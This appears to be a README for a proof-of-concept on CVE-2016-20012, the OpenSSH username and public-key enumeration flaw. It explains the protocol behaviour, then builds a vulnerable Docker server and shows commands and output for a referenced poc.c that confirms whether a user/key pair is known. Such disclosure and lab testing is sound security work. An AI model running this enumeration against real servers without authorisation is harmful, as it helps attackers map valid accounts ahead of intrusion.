## Description
OpenSSH through 8.7 allows remote attackers, who have a suspicion that a certain combination of username and public key is known to an SSH server, to test whether this suspicion is correct. This occurs because a challenge is sent only when that combination could be valid for a login session. NOTE: the vendor does not recognize user enumeration as a vulnerability for this product.
## Analysis
In the SSH protocol, the public key authentication worked that way:
1. The client sends an SSH_MSG_USERAUTH_REQUEST request with a username and a public key
2. The server responds with an SSH_MSG_USERAUTH_PK_OK message (or SSH_MSG_USERAUTH_FAILURE in case of failure)
3. The client signs the message from the server to prove it has the private key

The issue is that, in versions 8.7 and prior of OpenSSH, the message SSH_MSG_USERAUTH_PK_OK is sent only if the combination of the username and the public key is known. This lets an attacker gets information about the users of a server.
## Proof of concept
First, we will set up a vulnerable server in a Docker container:
```
docker build -t debian-ssh-cve-2016-20012 . && docker run -d debian-ssh-cve-2016-20012
```
We can check this server is vulnerable to this CVE using [`ssh-audit`](https://github.com/jtesta/ssh-audit):
```
$./ssh-audit.py 172.17.0.2 | grep cve
(cve) CVE-2021-41617                        -- (CVSSv2: 7.0) privilege escalation via supplemental groups
(cve) CVE-2016-20012                        -- (CVSSv2: 5.3) enumerate usernames via challenge response
```
We now need to add a public key for the user `john`:
```
$ssh-keygen -t rsa -b 3072 -f /tmp/john_keys -N ""
$ssh-copy-id -i /tmp/john_keys john@172.17.0.2
```
We can now use `poc.c` to check if the combination of the username `john` and the public key `/tmp/john_keys.pub` is known by the server:
```
$gcc -Wall -o poc poc.c -lssh2
$./poc john /tmp/john_keys.pub 172.17.0.2
The username 'john' and the public key '/tmp/john_keys.pub' are known by the server.
```
If we used another username, we would get an error:
```
$./poc mary /tmp/john_keys.pub 172.17.0.2
Either the server is not vulnerable to CVE-2016-20012, or the combination of the given username and public key is unknown by the server.
```
## References
- [NVD - CVE-2016-20012 Detail](https://nvd.nist.gov/vuln/detail/CVE-2016-20012)
- [rushter exploit](https://rushter.com/blog/public-ssh-keys/) (in Python)
- [RFC 4252](https://www.rfc-editor.org/rfc/rfc4252) - The Secure Shell (SSH) Authentication Protocol
- [Libssh2 library](https://libssh2.org/)